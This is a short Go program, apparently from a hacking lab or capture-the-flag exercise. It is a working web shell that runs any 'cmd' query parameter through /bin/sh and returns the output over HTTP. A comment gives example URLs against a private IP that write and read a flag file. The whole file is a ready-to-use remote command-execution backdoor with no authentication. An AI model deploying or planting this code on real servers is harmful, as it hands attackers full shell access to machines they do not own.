package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

var (
	shell    = "/bin/sh"
	shellArg = "-c"
	addr     string
)

/*
Test on Kali 2021
In linux terminal:
./simple_webshell 0.0.0.0:80

http://10.0.4.144/?cmd=echo 7 > flag.txt
http://10.0.4.144/?cmd=cat flag.txt
 */

func main() {
	if len(os.Args) != 2 {
		fmt.Printf("Usage: %s <listenAddress:listenPort> \n", os.Args[0])
		os.Exit(1)
	}

	addr = os.Args[1]
	http.HandleFunc("/", requestHandler)
	err := http.ListenAndServe(addr, nil)
	_ = err
}

func requestHandler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	if cmd == "" {
		//_,_ = w.Write([]byte("test"))
		return
	}

	command := exec.Command(shell, shellArg, cmd)
	output, err := command.Output()
	_, err = w.Write([]byte(fmt.Sprintf("cmd: %v \nresult: \n%v\n", cmd, string(output))))
	_ = err
}
